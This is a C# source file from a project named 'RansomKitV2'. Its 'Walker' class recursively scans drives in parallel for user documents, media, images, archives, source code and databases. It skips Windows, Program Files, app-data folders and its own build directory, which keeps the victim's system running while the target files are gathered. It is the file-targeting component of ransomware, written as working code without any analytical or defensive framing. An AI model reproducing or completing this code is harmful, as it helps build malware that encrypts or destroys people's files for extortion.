using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace RansomKitV2
{
    public static class Walker
    {
        private static readonly HashSet<string> AllowedExtensions = new(StringComparer.OrdinalIgnoreCase)
        {
            ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".rtf", ".csv", ".odt", ".ods", ".odp",
            ".mp3", ".wav", ".flac", ".aac", ".ogg", ".m4a",
            ".mp4", ".mkv", ".avi", ".mov", ".wmv", ".flv", ".webm",
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg", ".psd", ".ai", ".raw", ".heic",
            ".zip", ".rar", ".7z", ".tar", ".gz", ".iso",
            ".cs", ".cpp", ".c", ".h", ".py", ".js", ".ts", ".html", ".css", ".php", ".java", ".rb", ".go", ".rs",
            ".sln", ".csproj", ".vcxproj", ".xcodeproj", ".json", ".xml", ".yml", ".yaml", ".sql", ".db", ".sqlite"
        };

        private static readonly string[] ForbiddenPaths;

        static Walker()
        {
            var forbidden = new List<string>
            {
                Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            };

            string currentDir = AppContext.BaseDirectory;
            for (int i = 0; i < 5; i++)
            {
                if (string.IsNullOrEmpty(currentDir)) break;
                try
                {
                    if (Directory.EnumerateFiles(currentDir, "*.sln").Any() ||
                        Directory.EnumerateFiles(currentDir, "*.csproj").Any())
                    {
                        forbidden.Add(currentDir);
                        break;
                    }
                }
                catch { }
                var parent = Directory.GetParent(currentDir);
                if (parent == null) break;
                currentDir = parent.FullName;
            }
            forbidden.Add(AppContext.BaseDirectory);
            ForbiddenPaths = forbidden.ToArray();
        }

        public static List<string> Walk(IEnumerable<string> roots)
        {
            var results = new ConcurrentBag<string>();
            var options = new EnumerationOptions { IgnoreInaccessible = true };

            Parallel.ForEach(roots, root =>
            {
                if (!string.IsNullOrWhiteSpace(root) && Directory.Exists(root))
                {
                    WalkDirectory(root, results, options);
                }
            });

            return results.ToList();
        }

        private static void WalkDirectory(string dir, ConcurrentBag<string> results, EnumerationOptions options)
        {
            if (IsForbiddenDirectory(dir)) return;

            try
            {
                foreach (var file in Directory.EnumerateFiles(dir, "*", options))
                {
                    string ext = Path.GetExtension(file);
                    if (AllowedExtensions.Contains(ext))
                    {
                        results.Add(file);
                    }
                }

                Parallel.ForEach(Directory.EnumerateDirectories(dir, "*", options), subDir =>
                {
                    WalkDirectory(subDir, results, options);
                });
            }
            catch { }
        }

        private static bool IsForbiddenDirectory(string path)
        {
            foreach (var forbidden in ForbiddenPaths)
            {
                if (!string.IsNullOrWhiteSpace(forbidden) && path.StartsWith(forbidden, StringComparison.OrdinalIgnoreCase))
                    return true;
            }

            string dirName = Path.GetFileName(path);
            if (dirName.Equals("Windows", StringComparison.OrdinalIgnoreCase) ||
                dirName.Equals("System32", StringComparison.OrdinalIgnoreCase) ||
                dirName.Equals("WinSxS", StringComparison.OrdinalIgnoreCase) ||
                dirName.Equals("$Recycle.Bin", StringComparison.OrdinalIgnoreCase) ||
                dirName.Equals(".git", StringComparison.OrdinalIgnoreCase) ||
                dirName.Equals("bin", StringComparison.OrdinalIgnoreCase) ||
                dirName.Equals("obj", StringComparison.OrdinalIgnoreCase))
            {
                return true;
            }
            return false;
        }
    }
}